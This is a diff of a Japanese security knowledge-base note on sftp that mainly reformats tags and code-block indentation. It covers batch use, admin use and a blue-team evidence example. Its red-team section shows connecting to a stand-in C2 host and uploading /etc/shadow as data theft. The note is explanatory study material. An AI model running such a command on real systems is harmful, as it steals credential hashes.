@@ -1,7 +1,15 @@
 ---
-tags: ['sftp' 'ssh' 'file_transfer' 'networking' 'scp' 'rsync' 'ftp' 'ssh']
+tags:
+  - sftp
+  - ssh
+  - file_transfer
+  - networking
+  - scp
+  - rsync
+  - ftp
+  - ssh
 created: 2025-06-29 15:02
-modified: 2026-02-20 15:21
+modified: 2026-02-20 15:59
 environment: [OS/Linux]
 vulnearability: []
 knowledge_category: Command
@@ -35,17 +43,16 @@ knowledge_category: Command
 * **コマンド例**:
 
 		```bash
-    # batchfile.txt の中身
-    # cd /var/log/app
-    # mget *.log
-    # quit
+		# batchfile.txt の中身
+		# cd /var/log/app
+		# mget *.log
+		# quit
 
-    # バッチファイルを指定してsftpを実行
+		# バッチファイルを指定してsftpを実行
 
-    sftp -b batchfile.txt user@remote-server
+		sftp -b batchfile.txt user@remote-server
 
-    ```
-
+		```
 
 ## オプション説明 (`sftp` 内部のコマンド)
 
@@ -77,22 +84,21 @@ knowledge_category: Command
 * **例**:
 
 		```bash
-    # サーバーに接続
+		# サーバーに接続
 
-    sftp -i ~/.ssh/prod-key.pem admin@prod-server
+		sftp -i ~/.ssh/prod-key.pem admin@prod-server
 
-    # sftpプロンプトで操作
+		# sftpプロンプトで操作
 
-    sftp> cd /etc/nginx/conf.d
+		sftp> cd /etc/nginx/conf.d
 
-    sftp> get default.conf
+		sftp> get default.conf
 
-    sftp> quit
+		sftp> quit
 
-    ```
+		```
 
-
-### 2. ブルーチーム視点
+## 2. ブルーチーム視点
 
 * **タスク**: 侵害されたホストから、ファイルシステムを探索しながら証拠ファイルを収集する。
 * **組み合わせ**: `sftp <user>@<compromised_host>`
@@ -101,16 +107,15 @@ knowledge_category: Command
 
 		```bash
 
-    sftp analyst@compromised-host
+		sftp analyst@compromised-host
 
-    sftp> ls -l /tmp
+		sftp> ls -l /tmp
 
-    sftp> get /tmp/evil.sh
+		sftp> get /tmp/evil.sh
 
-    ```
+		```
 
-
-### 3. レッドチーム視点
+## 3. レッドチーム視点
 
 * **タスク**: **データ窃取 (Data Exfiltration)** と**ツール管理**。
 * **組み合わせ**: `sftp <attacker>@<c2_server>`
@@ -118,16 +123,15 @@ knowledge_category: Command
 * **例**:
 
 		```bash
-    # C2サーバーに接続
+		# C2サーバーに接続
 
-    sftp attacker@c2.example.com
+		sftp attacker@c2.example.com
 
-    # 窃取したパスワードハッシュをアップロード
+		# 窃取したパスワードハッシュをアップロード
 
-    sftp> put /etc/shadow
+		sftp> put /etc/shadow
 
-    ```
-
+		```
 
 ## エラーメッセージとトラブルシューティング
 
